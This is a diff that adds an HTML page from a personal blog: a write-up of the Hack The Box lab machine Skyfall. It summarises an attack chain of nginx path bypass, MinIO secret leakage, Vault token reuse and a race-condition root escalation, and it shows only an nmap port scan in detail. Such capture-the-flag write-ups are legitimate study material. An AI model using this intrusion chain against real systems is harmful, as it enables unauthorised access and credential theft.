@@ -1,0 +1,1730 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta charset='utf-8'>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="index, follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
+    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+    crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
+    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
+    crossorigin="anonymous"></script>
+  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    </script>
+  <link rel="stylesheet" href="/assets/css/style.css?v=18d79529ed1a410777646c1aaed0e478c964ecf8">
+  <link rel="stylesheet" href="/assets/css/prism.css">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
+  
+  <meta name="theme-color" content="#000000" />
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Skyfall writeup | Gabriel blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="HTB Skyfall writeup" />
+<meta name="author" content="gabri47" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Skyfall is a linux insane machine that teaches things about cloud and secrets management using third parties software. It starts with a web that lets me upload files that has a “Metrics” page forbidden. This path its managed with nginx and because its bad configured, I can bypass the forbidden injecting a \n url-encoded. In this page, there are MinIO metrics that leaks a subdomain used for a MinIO instance, whose version is vulnerable to information leakage that leaks the secrets used to connect to this instance. When I have the secrets, I can read files of another users and there are 3 versions of a home backup corresponding to askyy, of which the version 2 has a VAULT_TOKEN and VAULT_API_ADDR leaked in .bashrc. After that, I can use this vault variable to connect to vault, list ssh roles and connect with ssh as askyy to skyfall without askyy’s password but with the vault token. Then, to escalate to root, I will abuse a sudo privilege where I can execute vault-unseal that writes the vault key in a debug.log owned by root. This file is deleted each time is created so I can make a race condition to create it first so its owned by me and create a symlink to view its contents. Finally, I can use vault ssh with the new token to have access as root." />
+<meta property="og:description" content="Skyfall is a linux insane machine that teaches things about cloud and secrets management using third parties software. It starts with a web that lets me upload files that has a “Metrics” page forbidden. This path its managed with nginx and because its bad configured, I can bypass the forbidden injecting a \n url-encoded. In this page, there are MinIO metrics that leaks a subdomain used for a MinIO instance, whose version is vulnerable to information leakage that leaks the secrets used to connect to this instance. When I have the secrets, I can read files of another users and there are 3 versions of a home backup corresponding to askyy, of which the version 2 has a VAULT_TOKEN and VAULT_API_ADDR leaked in .bashrc. After that, I can use this vault variable to connect to vault, list ssh roles and connect with ssh as askyy to skyfall without askyy’s password but with the vault token. Then, to escalate to root, I will abuse a sudo privilege where I can execute vault-unseal that writes the vault key in a debug.log owned by root. This file is deleted each time is created so I can make a race condition to create it first so its owned by me and create a symlink to view its contents. Finally, I can use vault ssh with the new token to have access as root." />
+<link rel="canonical" href="http://localhost:4000/writeups/HTB/Skyfall.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/HTB/Skyfall.html" />
+<meta property="og:site_name" content="Gabriel blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-09-02T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Skyfall writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-09-02T00:00:00+02:00","datePublished":"2024-09-02T00:00:00+02:00","description":"Skyfall is a linux insane machine that teaches things about cloud and secrets management using third parties software. It starts with a web that lets me upload files that has a “Metrics” page forbidden. This path its managed with nginx and because its bad configured, I can bypass the forbidden injecting a \\n url-encoded. In this page, there are MinIO metrics that leaks a subdomain used for a MinIO instance, whose version is vulnerable to information leakage that leaks the secrets used to connect to this instance. When I have the secrets, I can read files of another users and there are 3 versions of a home backup corresponding to askyy, of which the version 2 has a VAULT_TOKEN and VAULT_API_ADDR leaked in .bashrc. After that, I can use this vault variable to connect to vault, list ssh roles and connect with ssh as askyy to skyfall without askyy’s password but with the vault token. Then, to escalate to root, I will abuse a sudo privilege where I can execute vault-unseal that writes the vault key in a debug.log owned by root. This file is deleted each time is created so I can make a race condition to create it first so its owned by me and create a symlink to view its contents. Finally, I can use vault ssh with the new token to have access as root.","headline":"HTB Skyfall writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/HTB/Skyfall.html"},"url":"http://localhost:4000/writeups/HTB/Skyfall.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+</head>
+
+<body>
+
+  <div id="header">
+    <div class="container">
+      <div class="title-container">
+        <a id="a-title" href="/">
+          <h1>Gabriel blog</h1>
+        </a>
+        <small class="nav-main d-flex justify-content-center">
+    
+    <a href = "/writeups">Writeups</a>
+    
+    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
+    
+    
+    <a href = "/blog">Blog</a>
+    
+    
+</small>
+
+      </div>
+      <br>
+
+      
+      
+<nav class="navbar navlinks">
+    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
+        <span>HTB Writeups</span>
+        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
+    </button>
+
+    <div class="navbar-collapse collapse" id="navbarSupportedContent">
+        <div class="m-1 mt-2">
+
+            
+            
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Blurry.html"> HTB Blurry writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;clearml/&gt; &lt;machine-learning/&gt; &lt;CVE-2024-24590/&gt; &lt;pickle/&gt; &lt;deserialization/&gt; &lt;python-torch/&gt; &lt;sudoers/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Freelancer.html"> HTB Freelancer writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;forgot-password/&gt; &lt;idor/&gt; &lt;qrcode/&gt; &lt;mssql/&gt; &lt;xp_cmdshell/&gt; &lt;sql-configuration/&gt; &lt;crash-dump-analysis/&gt; &lt;active-directory-acls/&gt; &lt;genericwrite/&gt; &lt;nt-hashes/&gt; &lt;secretsdump/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Boardlight.html"> HTB Boardlight writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;dolibarr/&gt; &lt;CVE-2023-30253/&gt; &lt;subdomain-enumeration/&gt; &lt;crm/&gt; &lt;erp/&gt; &lt;php-injection/&gt; &lt;php-configuration/&gt; &lt;mysql/&gt; &lt;password-reuse/&gt; &lt;suid/&gt; &lt;enlightenment/&gt; &lt;CVE-2022-37706/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Solarlab.html"> HTB Solarlab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;smb/&gt; &lt;spreadsheet/&gt; &lt;libreoffice/&gt; &lt;bruteforcing-web/&gt; &lt;rce/&gt; &lt;CVE-2023-33733/&gt; &lt;pdf/&gt; &lt;openfire-exploit/&gt; &lt;CVE-2023-32315/&gt; &lt;openfire-database/&gt; &lt;decrypt-password/&gt; &lt;java/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Intuition.html"> HTB Intuition writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;cookie-hijacking/&gt; &lt;cve-2023-24329/&gt; &lt;urllib/&gt; &lt;ssrf/&gt; &lt;ssrf-to-lfi/&gt; &lt;url-wrappers/&gt; &lt;ftp/&gt; &lt;ssh-key/&gt; &lt;ssh-key-comments/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;binary-analysis/&gt; &lt;suricata-logs/&gt; &lt;sudoers/&gt; &lt;ghidra/&gt; &lt;command-execution/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Mailing.html"> HTB Mailing writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;hMailServer/&gt; &lt;hMailServer-configuration/&gt; &lt;hash-cracking/&gt; &lt;outlook-vulnerabilities/&gt; &lt;CVE-2024-21413/&gt; &lt;ntlm-hash/&gt; &lt;libreoffice-odt-exploit/&gt; &lt;CVE-2023-2255/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Skyfall.html"> HTB Skyfall writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;forbidden-bypass/&gt; &lt;minio-cloud/&gt; &lt;minio-cve/&gt; &lt;CVE-2023-28432/&gt; &lt;hashicorp-vault/&gt; &lt;vault-ssh/&gt; &lt;sudoers/&gt; &lt;vault-unseal/&gt; &lt;race-condition/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Runner.html"> HTB Runner writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;teamcity/&gt; &lt;cve-2023-42793/&gt; &lt;teamcity-api/&gt; &lt;teamcity-rce/&gt; &lt;hsql/&gt; &lt;bcrypt/&gt; &lt;hash-cracking/&gt; &lt;id_rsa/&gt; &lt;portainer/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/FormulaX.html"> HTB FormulaX writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;websocket/&gt; &lt;simple-git-cve/&gt; &lt;CVE-2022-24066/&gt; &lt;mongodb/&gt; &lt;hash-cracking/&gt; &lt;librenms/&gt; &lt;librenms-abuse-template/&gt; &lt;laravel-blade/&gt; &lt;php/&gt; &lt;env-creds/&gt; &lt;sudoers/&gt; &lt;libreoffice-server-abuse/&gt; &lt;apache-uno-api/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Usage.html"> HTB Usage writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;sql-injection/&gt; &lt;boolean-based-sql-injection/&gt; &lt;hash-cracking/&gt; &lt;upload-vulnerabilities/&gt; &lt;monit/&gt; &lt;sudoers/&gt; &lt;abuse-symlinks/&gt; &lt;zip/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/IClean.html"> HTB IClean writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;ssti/&gt; &lt;sql/&gt; &lt;password-reuse/&gt; &lt;qpdf/&gt; &lt;sudoers/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/WifineticTwo.html"> HTB WifineticTwo writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;openplc/&gt; &lt;cve-2021-31630/&gt; &lt;wifi-scanning/&gt; &lt;pixiedust/&gt; &lt;port-scanning/&gt; &lt;ssh/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Headless.html"> HTB Headless writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;command-injection/&gt; &lt;sudoers/&gt; &lt;path-hijacking-.//&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Corporate.html"> HTB Corporate writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;bypass-csp/&gt; &lt;cookie-hijacking/&gt; &lt;idor/&gt; &lt;vpn/&gt; &lt;password-spraying/&gt; &lt;.mozilla-enumeration/&gt; &lt;bruteforce-bitwarden-pin/&gt; &lt;source-code-analysis/&gt; &lt;cookie-forging/&gt; &lt;jwt/&gt; &lt;docker-privesc/&gt; &lt;abupve/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Perfection.html"> HTB Perfection writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;ssti/&gt; &lt;ruby/&gt; &lt;crlf-injection/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;sudo-group/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Jab.html"> HTB Jab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xmpp/&gt; &lt;xmpp-user-enumeration/&gt; &lt;asreproast/&gt; &lt;hash-cracking/&gt; &lt;executedcom/&gt; &lt;dcomexec.py/&gt; &lt;openfire-rce/&gt; &lt;CVE-2023-32315/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Office.html"> HTB Office writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla-information-disclosure/&gt; &lt;CVE-2023-23752/&gt; &lt;smb-enumeration/&gt; &lt;pcap-tcp-packet-analysis/&gt; &lt;wireshark/&gt; &lt;krb-hash/&gt; &lt;joomla-rce/&gt; &lt;runascs/&gt; &lt;password-reuse/&gt; &lt;port-forwading/&gt; &lt;libreoffice-odt-exploitation/&gt; &lt;CVE-2023-2255/&gt; &lt;dpapi-creds/&gt; &lt;mimikatz/&gt; &lt;bloodhound/&gt; &lt;modifying-group-policy/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Crafty.html"> HTB Crafty writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;minecraft/&gt; &lt;log4j/&gt; &lt;jdgui/&gt; &lt;analyzing-jar/&gt; &lt;minecraft-plugins/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Pov.html"> HTB Pov Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;web.config/&gt; &lt;deserialization/&gt; &lt;exploiting-viewstate/&gt; &lt;decrypting-securestring/&gt; &lt;sedebugprivilege/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Analysis.html"> HTB Analysis Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;ldap-injection/&gt; &lt;php-shell/&gt; &lt;upload-vulnerabilities/&gt; &lt;autologon/&gt; &lt;dll-injection/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Bizness.html"> HTB Bizness Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;apache_ofbiz/&gt; &lt;CVE-2023-51467/&gt; &lt;CVE-2023-49070/&gt; &lt;hash_cracking/&gt; &lt;hash_salt/&gt; &lt;su/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Ouija.html"> HTB Ouija Writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;html_inspection/&gt; &lt;information_leakage/&gt; &lt;haproxy/&gt; &lt;http_request_smuggling/&gt; &lt;CVE-2021-40346/&gt; &lt;source_code_inspection/&gt; &lt;hash_extension_attack/&gt; &lt;lfi/&gt; &lt;proc_files/&gt; &lt;php_plugin/&gt; &lt;integer_overflow/&gt; &lt;buffer_overflow/&gt; &lt;webshell/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Monitored.html"> HTB Monitored Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Napper.html"> HTB Napper Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Devvortex.html"> HTB Devvortex Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Surveillance.html"> HTB Surveillance writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Hospital.html"> HTB Hospital Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Codify.html"> HTB Codify Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+      
+      <div id="bottom-bar">
+        <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+      </div>
+    </div>
+  </div>
+
+  <div id="content" class="container">
+    <section id="main_content">
+      <h5 class="mt-0 mb-2">
+        
+        
+          HTB
+        
+        
+      </h5>
+    
+      <h1 class="d-flex w-100 justify-content-between">
+        
+        
+          <span>HTB Skyfall writeup</span> <span class="points"> [50 pts] </span>
+        
+        
+      </h1>
+
+
+<script>
+
+</script>
+
+
+<p>Skyfall is a linux insane machine that teaches things about cloud and secrets management using third parties software. It starts with a web that lets me upload files that has a “Metrics” page forbidden. This path its managed with nginx and because its bad configured, I can bypass the forbidden injecting a \n url-encoded. In this page, there are MinIO metrics that leaks a subdomain used for a MinIO instance, whose version is vulnerable to information leakage that leaks the secrets used to connect to this instance. When I have the secrets, I can read files of another users and there are 3 versions of a home backup corresponding to askyy, of which the version 2 has a VAULT_TOKEN and VAULT_API_ADDR leaked in .bashrc. After that, I can use this vault variable to connect to vault, list ssh roles and connect with ssh as askyy to skyfall without askyy’s password but with the vault token. Then, to escalate to root, I will abuse a sudo privilege where I can execute vault-unseal that writes the vault key in a debug.log owned by root. This file is deleted each time is created so I can make a race condition to create it first so its owned by me and create a symlink to view its contents. Finally, I can use vault ssh with the new token to have access as root.</p>
+    
+      <h1 id="enumeration">
+        
+        
+          Enumeration <a href="#enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+    
+      <h2 id="port-recognaissance">
+        
+        
+          Port recognaissance <a href="#port-recognaissance" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:</p>
+
+<pre><code class="language-python">❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.9
+# Nmap 7.94SVN scan initiated Sun Apr 21 12:52:51 2024 as: nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN tcpTargeted 10.10.11.254
+Nmap scan report for 10.10.11.254
+Host is up (0.096s latency).
+Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
+|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Skyfall - Introducing Sky Storage!
+|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Apr 21 12:53:16 2024 -- 1 IP address (1 host up) scanned in 25.27 seconds
+</code></pre>
+
+<ul>
+  <li>-sVC: Identifies service and version.</li>
+  <li>-p-: scans all the range of ports (1-65535).</li>
+  <li>–open: shows only open ports and not filtered or closed.</li>
+  <li>-sS: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
+  <li>–min-rate 5000: Sends 5000 packets per second to improve velocity (don’t do this in a 
+real environment).</li>
+  <li>-n: Disables DNS resolution protocol.</li>
+  <li>-v: Enables verbose to see which ports are opened while it’s scanning</li>
+  <li>-Pn: Disables host discovery protocol (ping).</li>
+  <li>-oN targeted: Exports the evidence to a file named “tcpTargeted”.</li>
+</ul>
+    
